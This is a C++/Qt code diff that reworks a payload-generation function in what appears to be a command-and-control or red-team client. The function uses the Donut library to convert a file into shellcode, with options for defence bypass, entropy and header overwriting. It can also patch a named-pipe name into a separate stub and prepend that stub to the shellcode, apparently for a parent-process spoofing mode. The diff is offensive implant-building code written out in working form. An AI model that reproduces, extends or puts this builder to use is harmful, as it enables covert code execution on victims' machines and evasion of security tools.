@@ -469,7 +469,19 @@ QObject* BridgeApp::create_commands_group(const QString &name, const QJSValue &a
     return wrapper;
 }
 
-QString BridgeApp::donut_generate(const QString &file, const QString &params, const QString &arch, const QString &payload_type)
+// Unified Donut Generator
+QString BridgeApp::donut_generate(
+    const QString &file, 
+    const QString &params, 
+    const QString &arch, 
+    const QString &pipeName, 
+    const QString &stubBase64, 
+    int compress, 
+    int entropy, 
+    int exit_opt, 
+    int bypass, 
+    int headers
+)
 {
     QString resolvedFile = file;
     if (resolvedFile.startsWith("~/"))
@@ -479,12 +491,14 @@ QString BridgeApp::donut_generate(const QString &file, const QString &params, co
     memset(&c, 0, sizeof(c));
 
     c.inst_type = DONUT_INSTANCE_EMBED;
-    c.bypass    = DONUT_BYPASS_CONTINUE;
-    c.exit_opt  = DONUT_OPT_EXIT_PROCESS;
-    c.compress  = DONUT_COMPRESS_APLIB; 
-    c.entropy   = DONUT_ENTROPY_RANDOM;
-    c.format    = DONUT_FORMAT_BINARY;
-    c.headers   = DONUT_HEADERS_OVERWRITE;
+    c.format    = DONUT_FORMAT_BINARY; // Force binary internally
+
+    // Apply User Options
+    c.compress  = compress; // 1=None, 2=aPLib, (3=LZNT1, 4=Xpress [Windows Only Options]) 
+    c.entropy   = entropy;  // 1=None, 2=Random, 3=Default (Random+Symmetric)
+    c.exit_opt  = exit_opt; // 1=Thread, 2=Process, 3=Block
+    c.bypass    = bypass;   // 1=None, 2=Abort, 3=Continue
+    c.headers   = headers;  // 1=Overwrite, 2=Keep
 
     if (arch == "x86")
         c.arch = DONUT_ARCH_X86;
@@ -516,43 +530,38 @@ QString BridgeApp::donut_generate(const QString &file, const QString &params, co
         return "";
     }
 
-    QByteArray result((const char*)c.pic, c.pic_len);
+    QByteArray donutShellcode((const char*)c.pic, c.pic_len);
     DonutDelete(&c);
 
-    return result.toBase64();
-}
+    // --- Pipe Patching (PPID Mode) ---
+    if (!pipeName.isEmpty() && !stubBase64.isEmpty()) {
+        QByteArray stub = QByteArray::fromBase64(stubBase64.toUtf8());
+        
+        // Auto-detect pipe name offset
+        int offset = stub.indexOf("\\\\.\\pipe\\dnt_");
+        if (offset == -1) {
+             Q_EMIT engineError("donut_generate: Stub does not contain pipe name placeholder (\\\\.\\pipe\\dnt_)");
+             return "";
+        }
 
-QString BridgeApp::donut_generate_with_pipe(const QString &file, const QString &params, const QString &arch, const QString &pipeName, const QString &stubBase64)
-{
-    // Reuse donut_generate logic to get the shellcode
-    QString donutBase64 = donut_generate(file, params, arch, "exe");
-    if (donutBase64.isEmpty()) {
-        return ""; // Error already emitted by donut_generate
+        // Patch the pipe name into the stub
+        QByteArray pipeNameBytes = pipeName.toUtf8();
+        if (pipeNameBytes.size() > 32) {
+            pipeNameBytes = pipeNameBytes.left(32);  // Truncate if too long
+        }
+        
+        // Copy pipe name into stub at the detected offset (overwrite the placeholder)
+        for (int i = 0; i < pipeNameBytes.size() && (offset + i) < stub.size(); i++) {
+            stub[offset + i] = pipeNameBytes[i];
+        }
+        
+        // Append donut shellcode to stub
+        QByteArray combined = stub + donutShellcode;
+        return combined.toBase64();
     }
 
-    QByteArray donutShellcode = QByteArray::fromBase64(donutBase64.toUtf8());
-    QByteArray stub = QByteArray::fromBase64(stubBase64.toUtf8());
-    
-    // Auto-detect pipe name offset
-    int offset = stub.indexOf("\\\\.\\pipe\\dnt_");
-    if (offset == -1) {
-         Q_EMIT engineError("donut_generate_with_pipe: Stub does not contain pipe name placeholder (\\\\.\\pipe\\dnt_)");
-         return "";
-    }
-
-    // Patch the pipe name into the stub
-    QByteArray pipeNameBytes = pipeName.toUtf8();
-    if (pipeNameBytes.size() > 32) {
-        pipeNameBytes = pipeNameBytes.left(32);  // Truncate if too long
-    }
-    
-    // Copy pipe name into stub at the detected offset (overwrite the placeholder)
-    for (int i = 0; i < pipeNameBytes.size() && (offset + i) < stub.size(); i++) {
-        stub[offset + i] = pipeNameBytes[i];
-    }
-    
-    QByteArray combined = stub + donutShellcode;
-    return combined.toBase64();
+    // Standard Mode (No Pipe)
+    return donutShellcode.toBase64();
 }
 
 QJSValue BridgeApp::downloads() const
